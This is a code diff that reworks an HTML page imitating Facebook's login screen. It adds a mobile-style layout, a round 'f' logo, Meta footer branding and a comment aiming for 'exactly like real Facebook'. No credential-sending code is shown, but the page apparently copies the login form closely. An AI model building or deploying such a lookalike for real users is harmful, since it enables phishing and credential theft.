@@ -13,60 +13,86 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
+            background: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
         }
 
-        .fb-wrapper {
-            max-width: 990px;
-            width: 90%;
-            margin: 0 auto;
-            padding: 40px 20px;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-            gap: 40px;
-        }
-
-        .brand-area {
-            flex: 1;
-            min-width: 280px;
+        .container {
+            width: 100%;
+            max-width: 400px;
             padding: 20px;
         }
 
-        .fb-logo {
-            font-size: 58px;
-            font-weight: 700;
+        /* Top link */
+        .top-link {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .top-link a {
             color: #1877f2;
-            letter-spacing: -0.5px;
-            margin-bottom: 16px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
         }
 
-        .fb-tagline {
-            font-size: 26px;
-            font-weight: 400;
-            line-height: 32px;
-            color: #1c1e21;
-            width: 90%;
+        .top-link a:hover {
+            text-decoration: underline;
         }
 
-        .login-area {
-            flex: 1;
-            min-width: 360px;
+        /* Language selector */
+        .language {
+            text-align: center;
+            margin-bottom: 20px;
         }
 
-        .card {
+        .language select {
+            background: transparent;
+            border: none;
+            font-size: 14px;
+            color: #1b1f23;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* Circle F logo */
+        .logo-area {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .fb-circle {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #1877f2;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .fb-circle span {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+            transform: translateY(2px);
+            letter-spacing: -1px;
+        }
+
+        /* Login card */
+        .login-card {
             background: white;
             border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 16px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
         }
 
-        .card input {
+        .login-card input {
             width: 100%;
             padding: 14px 16px;
             margin-bottom: 12px;
@@ -77,12 +103,12 @@
             background: white;
         }
 
-        .card input:focus {
+        .login-card input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        .card input.error-input {
+        .login-card input.error-input {
             border-color: #f02849;
             background-color: #fff8f8;
         }
@@ -182,10 +208,10 @@
             fill: #1877f2;
         }
 
-        /* Meta Footer - fixed BELOW the login card */
+        /* Meta Footer - exactly like real Facebook */
         .meta-footer {
             text-align: center;
-            margin-top: 24px;
+            margin-top: 28px;
             padding-top: 12px;
             border-top: 1px solid #dadde1;
         }
@@ -197,7 +223,7 @@
             font-size: 14px;
             font-weight: 600;
             color: #1c1e21;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
 
         .infinity {
@@ -231,62 +257,64 @@
         .shake {
             animation: shake 0.3s ease-in-out;
         }
-
-        @media (max-width: 900px) {
-            .fb-wrapper {
-                flex-direction: column;
-                text-align: center;
-            }
-            .brand-area {
-                text-align: center;
-            }
-            .fb-tagline {
-                width: 100%;
-                font-size: 22px;
-            }
-        }
     </style>
 </head>
 <body>
 
-<div class="fb-wrapper">
-    <div class="brand-area">
-        <div class="fb-logo">facebook</div>
-        <div class="fb-tagline">Connect with friends and the world<br> around you on Facebook.</div>
+<div class="container">
+    <!-- Get Facebook for iOS -->
+    <div class="top-link">
+        <a href="#">Get Facebook for iOS and browse faster.</a>
     </div>
-    <div class="login-area">
-        <div class="card">
-            <input type="text" id="email" placeholder="Email address or mobile number">
 
-            <div class="password-wrapper">
-                <input type="password" id="password" placeholder="Password">
-                <button class="password-toggle" id="togglePassword" type="button">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                    </svg>
-                </button>
-            </div>
+    <!-- Language selector -->
+    <div class="language">
+        <select>
+            <option selected>English (UK)</option>
+            <option>Nepali</option>
+            <option>हिन्दी</option>
+        </select>
+    </div>
 
-            <div id="errorMsg" class="error-msg"></div>
-            <button class="login-btn" id="loginBtn">Log In</button>
-            <div class="forgot-link">
-                <a href="#">Forgotten password?</a>
-            </div>
-            <div class="divider"></div>
-            <button class="create-btn" id="createBtn">Create new account</button>
+    <!-- Circle F logo -->
+    <div class="logo-area">
+        <div class="fb-circle">
+            <span>f</span>
+        </div>
+    </div>
+
+    <!-- Login card -->
+    <div class="login-card">
+        <input type="text" id="email" placeholder="Mobile number or email address">
+        
+        <div class="password-wrapper">
+            <input type="password" id="password" placeholder="Password">
+            <button class="password-toggle" id="togglePassword" type="button">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                </svg>
+            </button>
         </div>
 
-        <!-- Meta Footer – directly under the login card -->
-        <div class="meta-footer">
-            <div class="meta-logo">
-                <span class="infinity">∞</span>
-                <span>Meta</span>
-            </div>
-            <div class="footer-links">
-                <a href="#">About</a>
-                <a href="#">Help</a>
-                <a href="#">More</a>
-            </div>
+        <div id="errorMsg" class="error-msg"></div>
+        <button class="login-btn" id="loginBtn">Log in</button>
+        <div class="forgot-link">
+            <a href="#">Forgotten password?</a>
+        </div>
+        <div class="divider"></div>
+        <button class="create-btn" id="createBtn">Create new account</button>
+    </div>
+
+    <!-- Meta Footer -->
+    <div class="meta-footer">
+        <div class="meta-logo">
+            <span class="infinity">∞</span>
+            <span>Meta</span>
+        </div>
+        <div class="footer-links">
+            <a href="#">About</a>
+            <a href="#">Help</a>
+            <a href="#">More</a>
         </div>
     </div>
 </div>
@@ -364,7 +392,7 @@
         const password = passwordInput.value;
 
         if (!email) {
-            showError('Email address or mobile number is required.', 'email');
+            showError('Mobile number or email address is required.', 'email');
             emailInput.focus();
             return;
         }
